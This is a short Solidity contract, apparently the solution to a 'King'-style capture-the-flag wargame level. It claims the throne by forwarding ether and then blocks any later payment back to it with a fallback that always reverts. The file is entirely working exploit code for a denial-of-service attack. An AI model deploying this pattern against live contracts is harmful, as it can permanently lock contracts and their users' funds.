// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Solve {
    function becomeKing(address king) public payable {
        (bool result, ) = king.call{value: msg.value}("");
        if (!result) revert();
    }

    fallback() external {
        revert("XD");
    }
}
